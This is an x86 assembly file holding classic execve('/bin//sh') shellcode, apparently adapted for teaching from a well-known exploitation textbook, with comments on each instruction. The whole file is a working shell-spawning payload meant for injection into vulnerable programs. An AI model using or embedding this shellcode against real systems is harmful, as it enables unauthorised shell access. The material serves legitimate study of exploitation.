.intel_syntax noprefix
.text
.global _start
_start:

# Taken in part from Erickson's Hacking: The Art of Eploitation, 1st Ed
# Improved upon by Scott Anecito
# https://github.com/sanecito

xor eax, eax             # Make sure eax is zero
push eax                 # Push null as string terminator
push 0x68732f2f          # Push "//sh"
push 0x6e69622f          # Push "/bin"
mov ebx, esp             # Put the address of "/bin//sh" into ebx, via esp
push eax                 # Push 32-bit null terminator to stack
mov edx, esp             # This is an empty array for envp
push ebx                 # Push string addr to stack above null terminator
mov ecx, esp             # This is the argv array with string ptr
mov al, 7                # Eventually make Syscall #11 (Execve)
inc al                   # Increment to get 11
inc al
inc al
inc al
int 0x80                 # Execute
